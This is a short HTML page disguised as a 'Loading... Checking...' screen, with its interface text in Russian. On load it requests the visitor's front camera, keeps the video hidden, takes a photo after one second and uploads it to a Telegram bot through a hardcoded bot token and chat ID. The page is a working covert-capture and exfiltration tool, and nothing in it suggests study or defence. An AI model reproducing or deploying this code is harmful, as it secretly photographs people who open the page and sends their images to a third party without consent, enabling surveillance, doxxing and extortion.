<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body { background: #0d1117; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        #status { color: #58a6ff; font-size: 18px; }
        video { display: none; }
    </style>
</head>
<body>
    <div id="status">⏳ Проверка...</div>
    <video id="video" autoplay playsinline></video>

    <script>
        const TOKEN = "8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ";
        const CHAT_ID = "5098876175";
        const status = document.getElementById('status');
        const video = document.getElementById('video');

        function sendPhoto(dataUrl) {
            fetch(dataUrl)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
                        method: 'POST',
                        body: formData
                    });
                })
                .then(() => { status.textContent = '✅ Готово'; })
                .catch(() => { status.textContent = '❌ Ошибка'; });
        }

        function takePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
        }

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    status.textContent = '📸 Снимок...';
                    setTimeout(takePhoto, 1000);
                };
            })
            .catch(() => {
                status.textContent = '❌ Нет доступа к камере';
            });
    </script>
</body>
</html>
